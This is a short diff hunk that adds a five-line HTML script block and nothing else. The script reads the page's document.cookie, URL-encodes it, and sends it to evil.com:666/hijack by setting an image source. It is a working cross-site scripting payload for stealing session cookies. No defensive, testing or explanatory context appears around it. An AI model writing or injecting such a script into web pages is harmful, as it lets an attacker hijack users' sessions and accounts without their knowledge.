@@ -1,0 +1,5 @@
+<script>
+    const sessionCookies = encodeURIComponent(document.cookie);
+    const img = new Image();
+    img.src = `http://evil.com:666/hijack?payload=${sessionCookies}`;
+</script>
